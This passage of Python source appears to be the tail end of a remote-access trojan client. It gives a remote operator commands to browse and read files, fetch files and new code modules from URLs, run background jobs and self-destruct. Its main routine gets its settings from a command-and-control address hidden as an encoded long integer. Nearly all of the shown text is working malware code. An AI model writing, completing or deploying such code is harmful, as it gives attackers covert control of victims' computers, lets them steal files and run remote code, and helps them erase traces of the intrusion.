    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
    
    @command
    def pwd(self): return os.getcwd()

    @command
    def wget(self, target): return urlretrieve(target)[0]
    
    @command
    def cat(self,filename): return open(filename).read(4000) 

    @command
    def ls(self, path='.'): return '\n'.join(os.listdir(path))

    @command
    def unzip(self, fname): return ZipFile(fname).extractall('.')

    @command
    def run(self): return self.run_modules()

    @command
    def info(self): return self._show(self.info)

    @command
    def jobs(self): return self._show(self.threads)
    
    @command
    def use(self, module): return self._use(module)

    @command
    def stop(self, module): return self._stop(module)

    @command
    def results(self): return self._show(self.result)
    
    @command
    def modules(self): return '\n'.join([mod for mod in self.mods])

    @command
    def commands(self): return '\n'.join([cmd for cmd in self.cmds])

    @command
    def download(self,url): return self._create_module_from_url(url)

    @command
    def options(self,*arg): return self._options(arg[0]) if arg else self._options()

    @command
    def get(self, target): return getattr(self, target)() if target in ('jobs','results','options','status','commands','modules','info') else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 

    @command    
    def status(self): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))

    @command
    def selfdestruct(self): return self.self_destruct()


# ----------------- MAIN --------------------------

def main(*args, **kwargs):
    client = Client(**kwargs)
    try:
        return client.start()
    except:
        return client

if __name__ == '__main__':
    main(**request('GET', long_to_bytes(5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)).json()['settings'])
    

